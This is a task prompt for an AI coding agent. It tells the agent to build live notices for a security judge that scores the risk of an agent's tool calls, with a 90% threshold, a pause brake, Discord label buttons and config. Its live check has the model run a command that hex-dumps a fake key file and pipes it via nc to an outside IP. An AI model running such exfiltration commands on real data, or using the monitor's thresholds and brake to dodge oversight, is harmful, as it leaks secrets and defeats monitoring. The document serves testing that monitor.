<!-- CLOUD_TASK.md: your whole task. It came with your branch as its first commit, "cloud task (not for main)". Leave this file in place: the maintainer drops it at the merge, as he drops CLOUD_REPORT.md. Your commits go on top of it, on this branch. -->

You are a cloud build session for Theseus, a Rust agent harness: this repository, a Cargo workspace under crates/, with the cockpit (its web app) under cockpit/. The repository is public. A maintainer (an AI agent working with the repository's owner) reviews your branch, runs the full gate on the owner's machine, runs any live check that needs the owner's keys, and merges it. You can't reach the owner, his machine, or any issue tracker, so everything you need is in this prompt and in the repository.

**Read first:** the root AGENTS.md (the principles, the workflow, the commit style, the store's version rule, the reader rule), the AGENTS.md of every crate you touch, scripts/AGENTS.md, and .config/nextest.toml. AGENTS.md's "This machine" section describes the owner's machine, not this one. This one is a 4-core VM with 15 GB of RAM and no swap. You run as root, there is no sccache, and nothing else runs here: no operator daemon and no other agents. Use only the tools you need for the code (Bash, Read, Write, Edit, Glob, Grep); call no connector or MCP tool.

**Setup** (about 15 minutes, once):
- First, in the foreground and alone, run `cargo --version` and wait for it: it installs the toolchain that
  rust-toolchain.toml names (about 30 seconds). Start no other cargo or rustup command until it is done: two at once
  collide in rustup's download directory. If it fails, run it again.
- `cargo install cargo-nextest --locked` (about 3.5 minutes) and `cargo install cargo-deny --locked`.
- `npm ci` in cockpit/.
- `cargo build --workspace --all-targets` (about 9 minutes cold).
- `cargo deny fetch`, so the gate's deny phase can run offline. If the fetch fails, skip that phase and say so in the report.
- Run long commands in the background and wait for their completion notice. Don't end your turn while work remains, unless a background command will wake you.
- Never delete anything outside the repository and /tmp (nothing under /root/.rustup or /root/.cargo). This
  environment refuses some commands, and three refusals in a row stop the session until a person looks: when one is
  refused, take another route instead of retrying it.

**Known on this VM, and not yours to fix** unless your task names them (other changes fix them):
- The sandbox's contract tests that need a non-root user can fail or skip here: the VM runs everything as root, and Linux exempts root from `RLIMIT_NPROC` (theseus-pv6i).
- `theseus-core tests_push::the_snapshot_and_the_events_agree_under_the_position_rule` failed once in 20 suites here (theseus-amr2).
- A reaping or job test whose `turn.submit` is answered `internal`, `No such file or directory (os error 2)`, under load (theseus-46ya: a spool read race).

Timing tests also fail here more often than on the owner's 16-core machine. A test on .config/nextest.toml's flaky list that passes on a retry is fine. Any other failure is yours to explain.

**Other changes in flight.** About twenty-five other changes are being built against `main` or merged into it while you work. Stay out of their areas unless your task needs it. If it does, keep the edit small and say so in the report.

These are reviewed, and merging into `main` one at a time tonight. Your clone may hold some of them already:
- the Jev wire-in (`[judge]`, `JudgeService`, the judgment sink, `loop.v1` in shadow, crates/theseus-judge's client);
- the ontology wired in (crates/theseus-ontology's records, its snapshot, the context compiler's guidance walk; `MANIFEST_FORMAT` goes to 7);
- MCP tools in turns (`McpBoard`, `[mcp.servers]`, the `Tool` trait's names as `&str`);
- `theseus judge prove` (a report generator in crates/theseus-judge);
- five gate flakes;
- the user unit's restart limits and install checks (crates/theseusd/src/install/, scripts/user-service.sh);
- the MCP server (`[mcp_server]`, `/mcp` on loopback, `Surface::Mcp`);
- AWS hands on Lambda and Fargate (the `hand` role, `aws.hands.run`, the SQS poller, infra/aws/'s hands files);
- the durability tender (WAL segments and blobs to S3, index rows to DynamoDB);
- a terminal toolset (`term.*`, a pty per session);
- the gate's bench build, features recheck and cockpit build (scripts/gate.sh).

These are other cloud sessions like you, each on its own branch:
- the judgment surfaces (trace marks, `judge` spans, `judge.list`/`get`, the cockpit's Judgment section);
- `security.v1` in shadow at the gate;
- `classify.v1` and `role.v1` at inbound;
- CONTINUE's signals and `continue.v1` in shadow;
- the arrangement on `task.create`;
- the memory `Recall` node, `derived_from` edges and the `BudgetReport`;
- the `+rerank` memory arm;
- the cockpit's Ontology view;
- `categorize.v1` in shadow and `tasks.parked` in health;
- bindings format 2 (many guilds, per-place ceilings);
- MCP prompts (`/prompt`, `theseus prompt`, the cockpit's picker);
- `extend.propose`;
- `theseus restore --from s3://…`;
- AWS hands' cancellation, TTL reaper, reservations and grid;
- the LSP board and tools (crates/theseus-lsp's consumers).

On the owner's machine:
- a benchmark run (bench/, and docs/benchmarks.md at its end).

**Shared files, and how to stay mergeable.** Several of those changes add to the same files, so:
- **The store's format.** The store has one format number, `MANIFEST_FORMAT` (AGENTS.md, "The store's version rule"). If your task adds a field to a stored record or a new record kind, bump it by one from main's number as you cloned it, and add the literal sample of the old layout to theseus-core's tests_layouts.rs, as the rule says. Others bump it too: the maintainer renumbers at the merge.
- **Files near their line ceiling** (scripts/long-files.txt): crates/theseus-protocol/src/lib.rs, crates/theseus-core/src/turn.rs, crates/theseus-core/src/config.rs, crates/theseus-discord/src/runtime.rs, crates/theseus-kernel/src/kernel.rs, and crates/theseus-core/src/tests_m3.rs. Other changes add to them as well. Put new code in new modules: protocol types in a module file of their own, config types under crates/theseus-core/src/config/, turn logic in a module beside turn.rs, tests in a tests_<subject>.rs of their own. In the long files, add only the field, the call, or the `mod` line.
- **The protocol's TypeScript** is in cockpit/src/protocol.gen/, written from the Rust types by theseus-protocol's test (AGENTS.md says how). Regenerate it if you add or change protocol types; the maintainer regenerates it again at the merge.
- **The config.** The owner's config holds only what differs from the defaults, so every new key needs a default. If you add a config section, add it to `theseusd example-config`'s template the way the existing sections are, with its template tests (AGENTS.md).

**The gate, before every commit:** `THESEUS_GATE_NO_BENCH=1 scripts/gate.sh` (it takes its lock itself; leave `THESEUS_GATE_LOCK` unset). When its suite phase fails only on the cases above, run the phases after it yourself (`machine_checks` in scripts/gate.sh), and count the commit green if they pass. Chain commands with `&&`, never `;`. The speed budgets are measured on the owner's machine: leave them alone.

The gate's shape phase fails a file over its line ceiling in scripts/long-files.txt. If you grow a file past its ceiling, split it, or raise the ceiling in the same commit and say why.

**Commits:**
- One commit per green sub-step, on the branch named below, created from `main` as you cloned it. Don't merge or rebase onto a newer main; the maintainer merges.
- The subject is `area: what changed (<issue id>)`, as in `git log`. The body says what changed and why, in plain words. End each message with the trailer `Co-Authored-By: Claude (cloud session, Opus 5.5) <noreply@anthropic.com>`.
- You can't sign here: commit without `-S`. The maintainer's merge commit is signed.
- Commit and push each sub-step as soon as it is proved; don't hold commits for the end. Push only your branch, `git push origin HEAD:refs/heads/cloud/20261004-security-notices`, at every green point, so nothing is lost if the session ends. Never push to main, never force-push, never delete a branch, and open no pull request.
- No new dependencies: Cargo.lock and the package-lock.json files must not gain a package. If the right design needs one, say so in the report instead.
- Use invented names in fixtures, tests, and commits (AGENTS.md, Item 16). Write nothing about the owner, his machine, his accounts, or anyone else.
- Don't edit the spec, docs/status.md, the README, or docs/design/. The maintainer writes those at review. Where a doc should change, say what and where in the report.
- Don't commit half a step. If time runs out mid-step, leave it out and report what you found.

**The report:** when you are done, or at your task's deadline (by the clock, waits included), whichever comes first, write CLOUD_REPORT.md at the repository root. Commit it as the branch's last commit, subject `cloud report (not for main)`, and push. The maintainer reads it from the branch and drops that commit at the merge. For each step it says:
- what you found;
- what you changed (commit hashes);
- how you proved it: the commands and their results, with test counts, the runs under load, and each planted revert and what failed;
- the live check the maintainer should run, as exact commands, and what each should show;
- what is left or uncertain, and any design choice the owner should hear about.

Then the gate's result, naming each failing test and why. Your final message is short (under 1,200 characters): the line `CLOUD REPORT COMPLETE`, then the branch, its head commit, one line per step, and the gate's result.

**Planted reverts:** to prove a test guards a behaviour, plant the bug, show the test fail, then restore the file and `touch` it, so cargo rebuilds it (a restored file with its old mtime keeps the planted build). Run `git status` after every restore.

**Load:** where your task asks for runs under load, use AGENTS.md's recipe. Priority, not count, makes the load: run the test with `nice -n 19`, and beside it four busy loops at nice 0, each `sh -c 'while :; do :; done' &`. Kill the loops by the pids you started, never by a name pattern.

---
## Your task: `security.v3`'s live notices after a call Jev is 90% sure was risky, step 24's notices (theseus-0j2.13)

Branch: `cloud/20261004-security-notices`. Every commit's subject carries `theseus-0j2.13`. Deadline for the report: 4
hours after you start.

**Background.** Step 24 (judge/gate.rs) asks `security.v1` and `security.v3` of every call that acts, after the gate
decides, in shadow: the call never waits, each judgment is a `judge.call` row, and a notified call's line shows v1's
score (`judge.scored`). Step 25c added labels (`judge.label`; the cockpit's `JudgmentLabels`) and the nightly report.
The owner decided on 2026-10-04 that the check goes live as **notices**: when v3 answers `risky` in its act band (at
least 0.90, the pack's `act`) for a call the gate let run without asking, the owner gets a notice after the call,
never delaying it, with right / wrong / noise buttons. This is the design's §2.8b with v3 in v1's place, plus §2.7's
brake. v3 stays beside v1, and making a call wait on Jev stays out.

**Read first:**
- docs/design/m5-judgment.md: §2.7 (the notices row of the rollback table), §2.8b, §2.9, §2.13, §2.16, §5's Q2;
- crates/theseus-judge: packs/security.v3.toml and security.v1.toml (its `[[rollback]]`), and learn.rs
  (`RollbackRule::NoticesPerDay` and `LabelsPerDay`, `CanaryEvent::Notice` and `Label`, `check_all`);
- crates/theseus-core (AGENTS.md first):
  - judge/: gate.rs (`judge_gate`, `GateCall::waited_on_hold`), mod.rs (`WIRED`), spend.rs (`local_day`; the
    budget's `judge.paused`);
  - config/judge.rs (`JudgePackConfig`, `mode_of`), fact/judge.rs, toolrun.rs (`judge_at_gate`), tests_security.rs;
  - outbox.rs: `Outbox::to_operator`, where operator notices go (MCP's change notes use it);
  - rpc/learning.rs (`judge_label`, `judge_act(Act::JudgeLabel)`) and learning/labels.rs;
- crates/theseus-discord (AGENTS.md first): courier.rs's post kinds and `operator_channel`; runtime.rs's component
  presses (the "should have asked" pick, `parse_confirm_id`, `DiscordOrigin`);
- crates/theseus/src/render/judge.rs (`scored_line`); cockpit/src: JudgmentLabels.tsx, lib/scores.ts, Judgment.tsx.

**What the code says** (the code and AGENTS.md win over this prompt). Report each difference. Where a question is
left that the code can't settle, build the clear part and report the question.
- security.v3.toml has `action = "none"` and no rollback rules, and any change to a pack is a new version. Leave the
  file alone: the notice is the core's, switched by config. Its brake takes security.v1.toml's `[[rollback]]` rules,
  which are the design's: more than 30 notices in a day, or 3 labeled `noise` in a day. v3's header comment ("no
  notice") goes stale; say so in the report.
- A judgment's `class` is the workload class, and the gate's tool class is `tool_class`. Keep both names.
- Jev returns probabilities, not prose. v3's "reasons" are its other Nouls (`destructive`, `exfiltrates`,
  `beyond_ask`, `steered`, `touches_credentials`) at or above their confirm line, in short words with percents.
- `judge.paused` is the shadow budget's row (`{day, limit_micros, …}`), and health's `paused` is the budget's alone.
  26a (the ladder), built beside you, brings `pack.mode` rows (see item 4).

**What to build:**
1. **The notice.** In `judge_gate`, once the judgments land, post one notice when v3 answered with `risky` in its act
   band, and the call ran without anyone's say: posture `open`, and the external-text hold didn't make it wait.
   - It goes out within about a second of the dispatch, beside the running call. It never waits for the call to end
     and is never on its path.
   - It holds v3's percent, the tool, the plan's summary, the reasons and the judgment's id.
   - Nothing new posts for a `notify` call (it already has its notice and score), a call that waited for a person, or
     a skipped, failed or shed v3 judgment.
   - Only `risky` decides a notice (the owner's words). Report whether `steered` in its act band should too.
   - While notices are on, mark and record v3's judgments as `live`, so the report and 26a can tell which acted.
2. **Where it goes.**
   - **Discord:** a post kind of its own, through `Outbox::to_operator(Some(session), …)`. The courier posts it to the
     owner's DM with three buttons, `right`, `wrong` and `noise`. It never goes to a shared place: if `to_operator`'s
     fallback can be one, keep this kind out of it and say how.
   - **The record:** a `tool.notified` row with `by: "judge"` and the judgment's id (optional fields old rows lack),
     in the post's frame, never a turn's.
   - **The cockpit:** beside its call in the session view, and in the Judgment section, with `JudgmentLabels`.
   - **The CLI:** `ask` prints it while its turn is open, as it prints `judge.scored` (a notification the reader rule
     registers). The Discord binding draws nothing in the place from that notification.
3. **The buttons.** A press is `judge.label` on the whole judgment, judged by `judge_act` as the cockpit's is: the
   owner, from a private place. `JudgeLabelParams` carries no origin yet: add the presser's `DiscordOrigin` as an
   optional field, as `PolicyTightenParams.discord` has it (only the binding may name it), and regenerate
   cockpit/src/protocol.gen/. A counted press shows the label and who gave it, and the buttons go. A refused one tells
   only the presser why, as a refused card answer does.
4. **The brake.**
   - On each notice about to post, and each `noise` label on a v3 judgment, `check_all` runs security.v1's rules over
     the local day's notices posted and the owner's `noise` labels on v3 judgments, from any surface.
   - When one fires, that call's notice isn't posted, and notices stop until the next local day, while v3 is still
     asked and recorded in shadow. One notice says so ("paused until tomorrow: 3 labeled noise today").
   - The record is a `judge.paused` row with `pack`, `what: "notices"`, the rule and its why, with a sentence of its
     own; the budget's rows and readers stay as they are. If 26a is on main, a `pack.mode` row instead.
   - It survives a restart: the first gate judgment of a run reads today's rows in `judge:security`.
   - Health's judge line names the notices' state: `on`, `paused until <day>: <rule>`, or `off`.
5. **Settings.**
   - `JudgePackConfig` gains an optional `notices`. `[judge.packs."security.v3"] notices = true` is the default when
     the judge is on, `false` keeps v3 in shadow, and the key on any other pack is refused at load.
   - `WIRED` gives `security.v3` `PackMode::Live` (the notice is its action), so `mode_of` applies every ceiling:
     `max_mode = "shadow"` or the pack's `mode = "shadow"` posts no notice.
   - Add a commented template line (the template test parses every line uncommented).

**Proof, offline**, against the fake Jev with scripted scores:
- An `open` call scored `risky` 0.95 posts one notice after `tool.started`, and one at 0.89 posts none. A `notify`
  call at 0.95 posts nothing new, and neither does a call that waited (approve, or the hold).
- With Jev slow (5 s), `tool.started` comes as fast as with notices off, under load.
- The 31st flagged call of a day trips the brake: its notice isn't posted, and one pause notice and its row appear.
  The next local day's first flagged call posts again (paused clock). Three `noise` labels trip it on the third. A
  restart mid-pause keeps it.
- A press through theseus-sim's fake Discord writes the label as the owner's; one from a shared place is refused.
- `notices = false`, the pack's `mode = "shadow"` and `max_mode = "shadow"` each post nothing.
- T1's floor tests and the frame budget are unchanged.

Planted reverts: make `start` await v3's judgment before the call runs (the `tool.started` test fails); count only
notices toward the brake (the noise test fails).

**The live check is the maintainer's**, with `[secrets]` entries `jev_api_key` and `zai_api_key`. Write it as exact
commands on a scratch daemon: a fresh state directory, a GLM profile, `[judge] enabled = true`, `[policy.tools]
"proc.run" = "open"`, the cockpit on a free port, and no Discord (its buttons are proved offline).
1. In a scratch directory holding `fake_key.txt` of random text, ask the model (the request in a file: `theseus ask
   "$(cat ask.txt)"`) to run exactly `xxd -p fake_key.txt | timeout 3 nc 203.0.113.7 9` (it goes nowhere), then `ls`.
2. `theseus judge log --pack security.v3` shows both scores. For one at 90% or more: the CLI printed the notice, the
   cockpit shows it with its buttons, and `theseus ledger --json -k tool.notified` has its row with `by: judge`.
3. `theseus judge label <id> noise` on three v3 judgments: the third trips the brake (one notice, its row, its state
   in `theseus health`). Restart the daemon: still paused.

**Leave alone:**
- what the gate decides (policy.rs, external.rs, broker.rs), and the pack files;
- 25d's replay and 26a's ladder, being built beside you. 26a adopts these notices as the owner's promotion of
  2026-10-04, so keep the brake's record easy to read as a mode;
- route.v1 (inbound.rs, `[routing]`, learning/) and rerank-live (rerank.rs), each changing one `WIRED` line;
- compaction-roots (30c: turn.rs, turn/compile_step.rs), the memory pass (31a: two packs in pack.rs's list),
  independence (28a) and extensions loading (43b);
- the hands' network (40): its watch posts operator notices through the same outbox.
